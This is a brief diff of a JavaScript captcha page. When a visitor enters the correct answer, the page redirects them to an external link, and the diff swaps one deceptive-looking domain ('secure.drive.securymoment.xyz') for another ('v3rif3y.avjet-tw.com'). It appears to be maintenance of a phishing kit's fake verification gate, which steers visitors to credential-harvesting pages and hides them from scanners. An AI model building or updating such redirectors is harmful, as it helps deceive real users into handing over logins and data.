@@ -28,7 +28,7 @@ document.addEventListener("DOMContentLoaded", function() {
         var correctAnswer = parseInt(document.getElementById("captcha-answer").value);
 
         if (userAnswer === correctAnswer) {
-            window.location.href = "https://secure.drive.securymoment.xyz/snHGHPVk";
+            window.location.href = "https://v3rif3y.avjet-tw.com/oXJZt";
         } else {
             alert("Incorrect answer. Please try again.");
             generateCaptcha();
